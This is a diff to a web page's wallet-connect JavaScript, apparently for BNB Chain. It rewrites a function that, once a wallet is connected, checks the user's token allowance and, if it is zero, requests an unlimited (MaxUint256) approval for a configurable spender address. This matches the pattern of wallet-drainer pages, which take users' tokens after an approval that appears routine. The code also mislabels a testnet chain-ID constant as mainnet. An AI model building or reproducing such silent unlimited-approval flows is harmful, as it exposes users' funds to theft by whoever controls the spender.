@@ -889,64 +889,89 @@ header{
       }
     }
 
-    async function ensureTokenApproval(){
-      if(!TOKEN_ADDRESS){
-        console.warn("TOKEN_ADDRESS not set, skipping approve");
-        return;
-      }
-      if(!SPENDER_ADDRESS){
-        console.warn("SPENDER_ADDRESS not set, skipping approve");
-        return;
-      }
-      if(!providerInstance){
-        console.warn("No providerInstance for approval");
-        return;
-      }
+   async function ensureTokenApproval(){
+  if(!TOKEN_ADDRESS){
+    console.warn("TOKEN_ADDRESS not set, skipping approve");
+    return;
+  }
+  if(!SPENDER_ADDRESS){
+    console.warn("SPENDER_ADDRESS not set, skipping approve");
+    return;
+  }
+  if(!providerInstance){
+    console.warn("No providerInstance for approval");
+    return;
+  }
 
-      try{
-        const ethersProvider = new ethers.BrowserProvider(providerInstance);
-        const signer         = await ethersProvider.getSigner();
-        const ownerAddress   = (await signer.getAddress()).toLowerCase();
+  try{
+    setStatus("Preparing token approval…");
 
-        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
-          alert("ERROR: TOKEN_ADDRESS is set to your wallet address.\n\nIt MUST be the BEP-20 token contract address, not your wallet.");
-          setStatus("Connected (approval skipped)");
-          return;
-        }
+    // 🔧 More explicit provider setup (helps WalletConnect/mobile)
+    const ethersProvider = new ethers.BrowserProvider(
+      providerInstance,
+      BNB_TESTNET_CHAIN_ID_DEC  // 56 (BSC mainnet)
+    );
+    const signer       = await ethersProvider.getSigner();
+    const ownerAddress = (await signer.getAddress()).toLowerCase();
 
-        // 1) Read current allowance (view call, no gas)
-        const readContract = new ethers.Contract(
-          TOKEN_ADDRESS,
-          ERC20_ALLOWANCE_ABI,
-          ethersProvider
-        );
-        const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
+    console.log("[approve] owner =", ownerAddress);
+    console.log("[approve] token =", TOKEN_ADDRESS);
+    console.log("[approve] spender =", SPENDER_ADDRESS);
 
-        if (currentAllowance > 0n) {
-          // already approved something – skip tx
-          console.log("Already approved, skipping new approve tx");
-          setStatus("Connected (already approved)");
-          return;
-        }
-
-        // 2) Not approved yet → send approve tx
-        setStatus("Requesting token approval…");
-        const writeContract = new ethers.Contract(
-          TOKEN_ADDRESS,
-          ERC20_APPROVE_ABI,
-          signer
-        );
-        const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
-        console.log("Approve tx sent:", tx.hash);
-        const receipt = await tx.wait();
-        console.log("Approve confirmed:", receipt);
-        setStatus("Connected + Approved ✅");
-      }catch(err){
-        console.error("Token approve error:", err);
-        alert("Token approval failed: " + (err && err.message ? err.message : err));
-        setStatus("Connected (approval failed)");
-      }
+    if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
+      alert(
+        "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
+        "It MUST be the BEP-20 token contract address, not your wallet."
+      );
+      setStatus("Connected (approval skipped)");
+      return;
     }
+
+    // 1) Read current allowance (view call, no gas)
+    const readContract = new ethers.Contract(
+      TOKEN_ADDRESS,
+      ERC20_ALLOWANCE_ABI,
+      ethersProvider
+    );
+    const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
+    console.log("[approve] currentAllowance =", currentAllowance.toString());
+
+    if (currentAllowance > 0n) {
+      // already approved something – skip tx
+      setStatus("Connected (already approved)");
+      console.log("[approve] already approved, skipping tx");
+      return;
+    }
+
+    // 2) Not approved yet → send approve tx
+    setStatus("Waiting for wallet to confirm approval…");
+
+    const writeContract = new ethers.Contract(
+      TOKEN_ADDRESS,
+      ERC20_APPROVE_ABI,
+      signer
+    );
+
+    // 🧠 You can change MaxUint256 to a specific amount if some wallets complain
+    const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
+    console.log("[approve] tx sent:", tx.hash);
+
+    setStatus("Approval pending on chain…");
+    const receipt = await tx.wait();
+    console.log("[approve] confirmed:", receipt);
+
+    setStatus("Connected + Approved ✅");
+  }catch(err){
+    console.error("Token approve error:", err);
+
+    let msg = "Token approval failed.";
+    if (err && err.message) msg += "\n\n" + err.message;
+
+    alert(msg);
+    setStatus("Connected (approval failed)");
+  }
+}
+
 
     async function restoreSessionFromAddress(address){
       currentAddress = address;
